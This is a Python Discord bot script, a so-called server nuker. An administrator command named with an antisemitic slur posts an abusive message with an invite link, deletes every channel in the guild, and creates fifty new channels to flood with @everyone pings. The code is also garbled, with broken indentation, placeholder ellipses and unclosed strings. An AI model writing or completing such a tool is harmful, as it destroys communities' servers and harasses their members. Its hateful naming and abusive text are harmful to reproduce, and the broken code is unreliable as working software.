import discord
from discord.ext import commands
import os

TOKEN = os.environ["DISCORD_TOKEN"]

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix=".", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
@bot.command()
@commands.has_permissions(administrator=True)
async def jew(ctx):
    await ctx.send("""
your server got nuked bullshit join this for appeal https://discord.gg/RY5gS7yKdD
.
""")

    # Delete existing channels
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass

    # Create new channels
    for i in range(1, 51):
        channel = await ctx.guild.create_text_channel(f"general-{i}")
       for i in range(...):
    channel = ...
    await channel.send(...)
@everyone @everyone
@everyone @everyone @everyone @everyone @everyone @everyone
@everyone join this for appeal  https://discord.gg/RY5gS7yKdD
""")
